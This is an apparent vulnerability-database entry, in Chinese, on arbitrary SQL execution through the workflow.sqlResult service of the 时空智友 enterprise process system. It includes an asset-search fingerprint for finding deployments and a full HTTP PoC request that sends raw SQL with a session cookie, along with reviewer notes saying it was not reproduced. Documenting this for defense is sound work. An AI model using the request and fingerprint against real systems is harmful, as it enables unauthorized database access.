---
source: "wy876 漏洞文库"
title: "时空智友 workflow.sqlResult任意SQL执行"
product: "时空智友"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本，示例SQLServer"
prerequisites: "带业务session，不明确未授权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/fg34lg8tq11uy1kp"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9FformserverSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
hunter: "web.icon==\"2464cbce5dd2681dd4fb62d055520d78\""
id: "vw-d29c84c541cb04676257da44"
entity_id: "ve-d29c84c541cb04676257da44"
schema_version: "1"
previous_fofa_unverified: "web.icon=="
---

# 时空智友 workflow.sqlResult任意SQL执行

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：时空智友；workflow.sqlResult任意SQL执行
- 版本、配置及部署条件：无版本，示例SQLServer
- 认证与权限前提：带业务session，不明确未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 标题formserver实际formservice；完整sql参数更像暴露SQL执行功能，需根因细化
- Hunter icon误抽fofa且截断；无返回数据库名证据
- 与62 Oracle不同服务可支持不同DB，不能混抄同配置

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在SQL注入漏洞，攻击者通过恶意构造的SQL查询来执行未经授权的数据库操作。当应用程序未能正确验证、转义或过滤用户提供的输入数据时，攻击者可以利用这个漏洞来执行恶意的SQL语句，从而绕过应用程序的访问控制和执行非法操作。

## 二、影响版本
+ 时空智友企业流程化管控系统

## 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面


## 四、漏洞复现
```http
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=123D902C244908C8DA7E61657166AA09; __qypid=""
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 50

{"params": {"a": "11"}, "sql": "select db_name()"}
```

> 请求长度说明：原资料 Content-Length 为 50；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fg34lg8tq11uy1kp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
